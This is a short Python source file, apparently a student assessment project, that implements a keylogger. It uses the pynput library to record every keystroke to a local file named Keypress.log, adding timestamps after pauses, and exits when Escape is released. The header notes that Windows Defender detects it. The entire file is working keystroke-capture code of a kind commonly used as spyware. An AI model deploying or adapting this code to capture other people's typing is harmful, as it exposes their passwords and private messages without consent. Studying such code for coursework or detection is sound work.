# Robert Sturzbecher Simple key logger for assessment project
# Note: Windows defender will detect this file 

import datetime
from pynput.keyboard import Key, Listener               # https://pypi.org/project/pynput/


# Globals and settings
lastActionTime = datetime.datetime.now()                # Used for tracking when the last keypress was, 

# Settings
filename = 'Keypress.log'                               # Filename of where to save data to

def keypress(key):                                      # a key was pressed
    f = open(filename, 'a')                             # open file in append mode
    global lastActionTime
    delta = datetime.datetime.now() - lastActionTime
    #print(str(delta.total_seconds()))
    if delta.total_seconds() > 10:                      # if time delta in inputs for >10 seconds, then write a new line with timestamp 
        f.write('\n'+str(datetime.datetime.now())+'\n' )    
    lastActionTime = datetime.datetime.now()            # update time of last action

    print(f'key: {key}')    
    if hasattr(key, 'char'):                            # Key has charactor (not a function key)
        if key.char == None:                            # some keys.char are returned as Nonetype and not a string type  
            f.write(str(key))                           # write the scancode instead
        else:
            f.write(key.char)                           # write key.char 
    elif key == Key.space:                              # space bar pressed.
        f.write(' ')
    elif key == Key.enter:                              # enter pressed
        f.write('\n')
    elif key == Key.tab:                                # tab pressed
        f.write('\t')
    elif key == Key.caps_lock:                          # caps lock pressed  
        f.write('[Upper]')
    else:
        f.write('['+key.name+']')                       # not a char key, most likely a function key and not one of the ones above
    f.close()


def release(key):                                   
    if key == Key.esc:                                  # exit when escape released (after pressed)
        return False

    
if __name__ == "__main__":    
    print('Python Key logger project - rsturzbecher 2022')
    with Listener(on_press=keypress, on_release=release) as listener:       
        listener.join()
    
 